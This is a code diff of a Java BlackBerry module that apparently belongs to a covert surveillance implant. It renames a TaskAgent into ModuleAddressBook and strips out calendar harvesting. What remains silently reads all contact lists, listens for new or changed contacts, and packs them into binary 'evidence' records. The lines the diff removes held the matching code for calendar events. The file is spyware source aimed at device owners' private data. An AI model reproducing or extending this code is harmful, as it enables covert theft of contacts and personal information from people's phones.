@@ -7,40 +7,36 @@
  * File         : ImAgent.java
  * Created      : 28-apr-2010
  * *************************************************/
-package blackberry.agent;
+package blackberry.module;
 
 import java.util.Date;
 import java.util.Enumeration;
 
 import javax.microedition.pim.Contact;
 import javax.microedition.pim.ContactList;
-import javax.microedition.pim.Event;
-import javax.microedition.pim.EventList;
 import javax.microedition.pim.PIM;
 import javax.microedition.pim.PIMException;
 import javax.microedition.pim.PIMItem;
 
 import net.rim.blackberry.api.pdap.BlackBerryContact;
-import net.rim.blackberry.api.pdap.BlackBerryEvent;
 import net.rim.blackberry.api.pdap.BlackBerryPIMList;
 import net.rim.blackberry.api.pdap.PIMListListener;
 import net.rim.device.api.util.DataBuffer;
-import blackberry.crypto.Encryption;
+import blackberry.config.ConfModule;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceType;
 import blackberry.evidence.Markup;
 import blackberry.fs.Path;
 import blackberry.interfaces.UserAgent;
-import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
-import blackberry.utils.WChar;
 
 /**
  * The Class ImAgent.
  */
-public final class TaskAgent extends Module implements PIMListListener,
-        UserAgent {
+public final class ModuleAddressBook extends BaseModule implements
+        PIMListListener, UserAgent {
     //#ifdef DEBUG
     static Debug debug = new Debug("TaskAgent", DebugLevel.VERBOSE);
     //#endif
@@ -59,16 +55,6 @@ public final class TaskAgent extends Module implements PIMListListener,
     final int version = 0x01000000;
 
     /**
-     * Instantiates a new Organizer agent. TaskAgent on Mobile
-     * 
-     * @param agentStatus
-     *            the agent status
-     */
-    public TaskAgent(final boolean agentEnabled) {
-        super(Module.AGENT_TASK, agentEnabled, false, "TaskAgent");
-    }
-
-    /**
      * Instantiates a new im agent.
      * 
      * @param agentStatus
@@ -76,8 +62,7 @@ public final class TaskAgent extends Module implements PIMListListener,
      * @param confParams
      *            the conf params
      */
-    protected TaskAgent(final boolean agentStatus, final byte[] confParams) {
-        this(agentStatus);
+    protected ModuleAddressBook() {
 
         //#ifdef DEBUG
         debug.trace("TaskAgent");
@@ -85,16 +70,15 @@ public final class TaskAgent extends Module implements PIMListListener,
 
         markup = new Markup(this);
 
-        parse(confParams);
         setDelay(SLEEPTIME);
         setPeriod(PERIODTIME);
-
-        if (!enabled) {
-            markup.removeMarkup();
-        }
     }
 
     byte[] examplePacket;
+
+    public boolean parse(ConfModule conf) {
+        return true;
+    }
 
     public synchronized void actualStart() {
         //#ifdef DEBUG
@@ -107,18 +91,12 @@ public final class TaskAgent extends Module implements PIMListListener,
             list = (BlackBerryPIMList) pim.openPIMList(PIM.CONTACT_LIST,
                     PIM.READ_ONLY);
             list.addListener(this);
-            list = (BlackBerryPIMList) pim.openPIMList(PIM.EVENT_LIST,
-                    PIM.READ_ONLY);
-            list.addListener(this);
+
         } catch (final PIMException e) {
             //#ifdef DEBUG
             debug.error(e);
             //#endif
         }
-
-        //String pkt = "6a000000000000010100000100000000008044f82171cc0100e8085a2a71cc01000000000200000000000000000000000a000001500072006f007600610018000004450064006900740065006400200061006700610069006e000c0000104d0069006c0061006e006f00";
-        //examplePacket = Utils.hexToByteArray(pkt, 0, pkt.length());
-        //evidence.atomicWriteOnce(null, EvidenceType.CALENDAR, examplePacket);
 
     }
 
@@ -133,9 +111,7 @@ public final class TaskAgent extends Module implements PIMListListener,
             list = (BlackBerryPIMList) pim.openPIMList(PIM.CONTACT_LIST,
                     PIM.READ_ONLY);
             list.removeListener(this);
-            list = (BlackBerryPIMList) pim.openPIMList(PIM.EVENT_LIST,
-                    PIM.READ_ONLY);
-            list.removeListener(this);
+
         } catch (final PIMException e) {
             //#ifdef DEBUG
             debug.error(e);
@@ -152,52 +128,17 @@ public final class TaskAgent extends Module implements PIMListListener,
         debug.trace("actualRun");
         //#endif
 
-        boolean haveToLoadContact = true;
-        boolean haveToLoadCalendar = false;
-        //#ifdef CALENDAR
-        haveToLoadCalendar=true;
-        //#endif
-        
-        boolean readSuccesfullyContact = false, readSuccesfullyCalendar = false;
-
-        if (markup.isMarkup()) {
-            byte[] ret;
-            try {
-                ret = markup.readMarkup();
-                if (ret != null) {
-                    haveToLoadContact = ret[0] == 1;
-                    haveToLoadCalendar = ret[1] == 1;
-                }
-            } catch (Exception ex) {
-                //#ifdef DEBUG
-                debug.error("actualRun: " + ex);
-                //#endif
-            }
-        }
-
-        if (haveToLoadContact) {
+        if (!markup.isMarkup()) {
             //#ifdef DEBUG
             debug.trace("actualRun: getting Contact List");
             //#endif
-            readSuccesfullyContact = getContactList();
-        }
 
-        if (haveToLoadCalendar) {
-            //#ifdef DEBUG
-            debug.trace("actualRun: getting Calendar List");
-            //#endif
-            //#ifdef CALENDAR
-            readSuccesfullyCalendar = getCalendarList();
-            //#endif
-        }
-
-        if (readSuccesfullyContact || readSuccesfullyCalendar) {
-            //#ifdef DEBUG
-            debug.trace("actualRun: need to write markup");
-            //#endif
-            markup.writeMarkup(new byte[] {
-                    (byte) (readSuccesfullyContact ? 0 : 1),
-                    (byte) (readSuccesfullyCalendar ? 0 : 1) });
+            if (getContactList()) {
+                //#ifdef DEBUG
+                debug.trace("actualRun: need to write markup");
+                //#endif
+                markup.createEmptyMarkup();
+            }
         }
     }
 
@@ -238,43 +179,6 @@ public final class TaskAgent extends Module implements PIMListListener,
 
     }
 
-    private boolean getCalendarList() {
-        EventList calendarList;
-        int number = 0;
-
-        String[] lists = PIM.getInstance().listPIMLists(PIM.EVENT_LIST);
-        //#ifdef DEBUG
-        debug.trace("actualRun lists: " + lists.length);
-        //#endif
-
-        boolean ret = true;
-
-        for (int i = 0; i < lists.length; i++) {
-            try {
-                String name = lists[i];
-                //#ifdef DEBUG
-                debug.trace("actualRun: opening " + name);
-                //#endif
-                calendarList = (EventList) PIM.getInstance().openPIMList(
-                        PIM.EVENT_LIST, PIM.READ_ONLY, name);
-
-                number = saveEventEvidence(calendarList);
-                //#ifdef DEBUG
-                debug.trace("actualRun: saved " + number);
-                //#endif
-
-            } catch (final PIMException e) {
-                //#ifdef DEBUG
-                debug.error(e);
-                //#endif
-
-                ret = false;
-            }
-        }
-        return ret;
-
-    }
-
     private int saveContactEvidence(ContactList contactList)
             throws PIMException {
         final Enumeration eContacts = contactList.items();
@@ -283,7 +187,8 @@ public final class TaskAgent extends Module implements PIMListListener,
         debug.trace("saveContactEvidence: got contacts");
         //#endif
 
-        evidence.createEvidence(null, EvidenceType.ADDRESSBOOK);
+        Evidence evidence = new Evidence(EvidenceType.ADDRESSBOOK);
+        evidence.createEvidence();
 
         Contact contact;
         int number = 0;
@@ -304,40 +209,6 @@ public final class TaskAgent extends Module implements PIMListListener,
 
         //#ifdef DEBUG
         debug.trace("saveContactEvidence: finished contacts. Total: " + number);
-        //#endif
-        evidence.close();
-
-        return number;
-    }
-
-    private int saveEventEvidence(EventList eventList) throws PIMException {
-        final Enumeration eEvents = eventList.items();
-
-        //#ifdef DEBUG
-        debug.trace("saveEventEvidence: got calendar");
-        //#endif
-
-        evidence.createEvidence(null, EvidenceType.CALENDAR);
-
-        BlackBerryEvent event;
-        int number = 0;
-        while (eEvents.hasMoreElements()) {
-            //#ifdef DEBUG
-            debug.trace("saveEventEvidence: event #" + ++number);
-            //#endif
-            try {
-                event = (BlackBerryEvent) eEvents.nextElement();
-                final byte[] packet = getEventPacket(eventList, event);
-                evidence.writeEvidence(packet);
-            } catch (final Exception ex) {
-                //#ifdef DEBUG
-                debug.error(ex);
-                //#endif
-            }
-        }
-
-        //#ifdef DEBUG
-        debug.trace("saveEventEvidence: finished events. Total: " + number);
         //#endif
         evidence.close();
 
@@ -535,121 +406,6 @@ public final class TaskAgent extends Module implements PIMListListener,
         return packet;
     }
 
-    private byte[] getEventPacket(EventList events, BlackBerryEvent event) {
-        String summary = null, location = null, note = null;
-        Date start = null, end = null, revision;
-        int alarm, classEvent;
-        int uid = 0;
-
-        String uidEvent = getCalendarStringField(events, event, Event.UID);
-        uid = Encryption.CRC32(uidEvent.getBytes());
-
-        summary = getCalendarStringField(events, event, Event.SUMMARY);
-        location = getCalendarStringField(events, event, Event.LOCATION);
-        note = getCalendarStringField(events, event, Event.NOTE);
-
-        long startLong = getCalendarDateField(events, event, Event.START);
-        start = new Date(startLong);
-
-        long endLong = getCalendarDateField(events, event, Event.END);
-        end = new Date(endLong);
-
-        long revisionLong = getCalendarDateField(events, event, Event.REVISION);
-        revision = new Date(revisionLong);
-
-        final DataBuffer dbPayload = new DataBuffer(false);
-
-        dbPayload.writeInt(0);
-        dbPayload.writeInt(version);
-        dbPayload.writeInt(uid);
-
-        int flags = 0;
-        int sensitivity = 0;
-        int busy = 2;
-        int duration = 0;
-        int meeting = 0;
-
-        dbPayload.writeInt(flags);
-        dbPayload.writeLong(DateTime.getFiledate(start));
-        dbPayload.writeLong(DateTime.getFiledate(end));
-        dbPayload.writeInt(sensitivity);
-        dbPayload.writeInt(busy);
-        dbPayload.writeInt(duration);
-        dbPayload.writeInt(meeting);
-
-        appendCalendarString(dbPayload, POOM_STRING_SUBJECT, summary);
-        appendCalendarString(dbPayload, POOM_STRING_BODY, note);
-        appendCalendarString(dbPayload, POOM_STRING_LOCATION, location);
-
-        //#ifdef DEBUG
-        debug.trace("getEventPacket: Adding " + summary + " body: " + note
-                + " location: " + location);
-        //#endif
-
-        int size = dbPayload.getLength();
-        //dbPayload.trim(true);
-
-        dbPayload.rewind();
-        dbPayload.writeInt(size);
-
-        byte[] packet = dbPayload.toArray();
-
-        //#ifdef DEBUG
-        debug.trace("packet: " + Utils.byteArrayToHex(packet));
-        //#endif                
-
-        return packet;
-    }
-
-    private long getCalendarDateField(EventList events, BlackBerryEvent event,
-            int type) {
-        long ret = 0;
-        try {
-            if (events.isSupportedField(type)) {
-                ret = event.getDate(type, PIMItem.ATTR_NONE);
-                //#ifdef DEBUG
-                debug.trace("getCalendarDateField: " + ret);
-                //#endif
-            }
-        } catch (IndexOutOfBoundsException ex) {
-            //#ifdef DEBUG
-            debug.error("getCalendarStringField: " + ex);
-            //#endif
-        }
-
-        return ret;
-    }
-
-    private String getCalendarStringField(EventList events,
-            BlackBerryEvent event, int type) {
-        String ret = null;
-        try {
-            if (events.isSupportedField(type)) {
-                ret = event.getString(type, PIMItem.ATTR_NONE);
-                //#ifdef DEBUG
-                debug.trace("getCalendarStringField: " + ret);
-                //#endif
-            }
-        } catch (IndexOutOfBoundsException ex) {
-            //#ifdef DEBUG
-            debug.error("getCalendarStringField: " + ex);
-            //#endif
-        }
-
-        return ret;
-    }
-
-    private void appendCalendarString(DataBuffer payload, int type,
-            String message) {
-        if (message != null) {
-            byte[] data = WChar.getBytes(message, false);
-            int len = type | (data.length & 0x00ffffff);
-            byte[] prefix = Utils.intToByteArray(len);
-            payload.write(prefix);
-            payload.write(data);
-        }
-    }
-
     private void addField(DataBuffer dbPayload, String[] fields,
             int fieldNumber, byte logType) {
 
@@ -838,7 +594,7 @@ public final class TaskAgent extends Module implements PIMListListener,
         //#ifdef DEBUG
         debug.trace("itemAdded: " + item);
         //#endif
-        save(item);
+        save((Contact) item);
     }
 
     public void itemRemoved(PIMItem item) {
@@ -854,25 +610,18 @@ public final class TaskAgent extends Module implements PIMListListener,
         debug.trace("itemUpdated: " + itemNew);
         //#endif
 
-        save(itemNew);
+        save((Contact) itemNew);
     }
 
-    private void save(PIMItem item) {
+    private void save(Contact item) {
         try {
-            if (item instanceof Contact) {
-                final ContactList contactList = (ContactList) item.getPIMList();
-                final BlackBerryContact contact = (BlackBerryContact) item;
-                final byte[] payload = getContactPacket(contactList, contact);
 
-                evidence.atomicWriteOnce(null, EvidenceType.ADDRESSBOOK,
-                        payload);
-            } else if (item instanceof Event) {
-                final EventList eventList = (EventList) item.getPIMList();
-                final BlackBerryEvent event = (BlackBerryEvent) item;
-                final byte[] payload = getEventPacket(eventList, event);
+            final ContactList contactList = (ContactList) item.getPIMList();
+            final BlackBerryContact contact = (BlackBerryContact) item;
+            final byte[] payload = getContactPacket(contactList, contact);
 
-                evidence.atomicWriteOnce(null, EvidenceType.CALENDAR, payload);
-            }
+            Evidence evidence = new Evidence(EvidenceType.ADDRESSBOOK);
+            evidence.atomicWriteOnce(payload);
 
         } catch (final Exception ex) {
             //#ifdef DEBUG
@@ -887,4 +636,5 @@ public final class TaskAgent extends Module implements PIMListListener,
         }
         Debug.init();
     }
+
 }
